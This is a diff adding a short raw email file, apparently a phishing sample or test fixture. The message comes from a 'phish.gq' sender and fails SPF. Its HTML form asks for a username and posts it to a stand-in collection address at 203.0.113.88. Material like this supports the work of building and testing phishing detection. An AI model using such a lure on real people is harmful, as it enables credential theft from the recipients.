@@ -1,0 +1,15 @@
+From: forms@phish.gq
+To: user@company.local
+Subject: Confirm session
+Message-ID: <form1@phish.gq>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Authentication-Results: mx.company.local; spf=softfail; dkim=none; dmarc=none
+
+<html><body>
+<p>Session check:</p>
+<form action="http://203.0.113.88/collect" method="post">
+<input type="text" name="user"/>
+<input type="submit" value="OK"/>
+</form>
+</body></html>
